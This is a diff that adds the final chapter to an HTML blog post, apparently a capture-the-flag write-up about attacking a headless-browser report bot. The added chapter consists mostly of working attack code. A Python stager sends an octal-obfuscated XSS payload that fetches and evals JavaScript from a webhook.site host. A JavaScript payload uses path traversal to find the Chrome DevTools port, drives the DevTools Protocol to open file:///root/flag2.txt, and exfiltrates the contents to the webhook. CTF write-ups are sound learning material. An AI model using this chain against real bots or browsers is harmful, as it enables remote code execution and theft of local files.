@@ -178,6 +178,7 @@
     <li><a href="#chapter-2-landing-our-xss">Chapter 2: Landing our XSS</a></li>
     <li><a href="#chapter-3-xss-delivery">Chapter 3: XSS Delivery</a></li>
     <li><a href="#chapter-4-bot-control">Chapter 4: Bot Control</a></li>
+    <li><a href="#chapter-5-finale">Chapter 5: Finale</a></li>
   </ul>
 </nav>
     </div>
@@ -719,7 +720,117 @@ Let&rsquo;s try:</p>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;&#39;Page.navigate&#39; wasn&#39;t found&#34;</span>
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div>
+</span></span></code></pre></div><p>Let&rsquo;s simplify things and just connect to a page-context CDP socket instead. We can do that by connecting to <code>/devtools/page/&lt;targetId&gt;</code> instead of the <code>/devtools/browser</code> endpoint.</p>
+<h2 id="chapter-5-finale">Chapter 5: Finale<a href="#chapter-5-finale" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>We experimented with CDP and built a convincing exploit path.</p>
+<p>Let&rsquo;s put everything together.</p>
+<p>First, we have our XSS stager, crafted and sent through this Python script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> httpx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#url = &#39;https://hackthebot2-361ce3873f4d6b2b.deploy.phreaks.fr&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_payload</span>():
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">const hook = &#39;http://webhook.site/&lt;id&gt;/&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">fetch(hook).then(r =&gt; r.text()).then(text =&gt; eval(text))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;input oncontentvisibilityautostatechange=&#39;eval(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([oct(i)[<span style="color:#ae81ff">2</span>:] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> payload])<span style="color:#e6db74">}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#39; style=content-visibility:auto&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> quote(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> get_payload()
+</span></span><span style="display:flex;"><span>report_link <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;?q=&#39;</span> <span style="color:#f92672">+</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/report&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;url&#39;</span>: report_link})
+</span></span><span style="display:flex;"><span>log_file <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>print(log_file)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>log_file<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p>Then, in our staged JS payload (served from hook), we will do the following:</p>
+<ol>
+<li>Use path traversal to grab CDP browser endpoint.</li>
+<li>Connect to CDP browser endpoint via web sockets.</li>
+<li>Use <code>Target.getTargets</code> to get the targetId of a blank page (we don&rsquo;t want to disrupt our current &ldquo;master&rdquo; page).</li>
+<li>Connect to CDP page endpoint via web sockets.</li>
+<li>Use the now-available <code>Page.navigate</code> to navigate to local <code>file:///root/flag2.txt</code>.</li>
+<li>Read the page&rsquo;s content using <code>Runtime.evaluate</code>, just as we would in a local devtools console.</li>
+</ol>
+<p>Let&rsquo;s illustrate that in code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;http://localhost/logs../browser_cache/DevToolsActivePort&#34;</span>
+</span></span><span style="display:flex;"><span>        ).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">r</span>) =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> [<span style="color:#a6e22e">port</span>, <span style="color:#a6e22e">path</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\n&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">devTools</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">path</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>(<span style="color:#a6e22e">devTools</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exfil</span>(<span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">hook</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;message&#34;</span>, { <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span> });
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onopen</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Target.getTargets&#34;</span>,
+</span></span><span style="display:flex;"><span>                })
+</span></span><span style="display:flex;"><span>            );
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onmessage</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">event</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">targetId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">targetInfos</span>[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">targetId</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exfil</span>(<span style="color:#a6e22e">targetId</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// open new socket in page context
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">`http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/devtools/page/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">targetId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>            );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// navigate to flag
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onopen</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Page.navigate&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">params</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;file:///root/flag2.txt&#34;</span> },
+</span></span><span style="display:flex;"><span>                    })
+</span></span><span style="display:flex;"><span>                );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// wait for flag to load before checking the page&#39;s content
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>                            <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>                            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Runtime.evaluate&#34;</span>,
+</span></span><span style="display:flex;"><span>                            <span style="color:#a6e22e">params</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#a6e22e">expression</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                                    <span style="color:#e6db74">&#34;document.documentElement.innerHTML&#34;</span>,
+</span></span><span style="display:flex;"><span>                            },
+</span></span><span style="display:flex;"><span>                        })
+</span></span><span style="display:flex;"><span>                    );
+</span></span><span style="display:flex;"><span>                }, <span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>            };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// exfiltrate the output of 2nd request
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onmessage</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">event</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>).<span style="color:#a6e22e">id</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">2</span>) <span style="color:#a6e22e">exfil</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>            };
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// guard rail to report any errors back to us
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exfil</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">stack</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><p>And that&rsquo;s pretty much it yet!</p>
+
       </div></div>
 
   
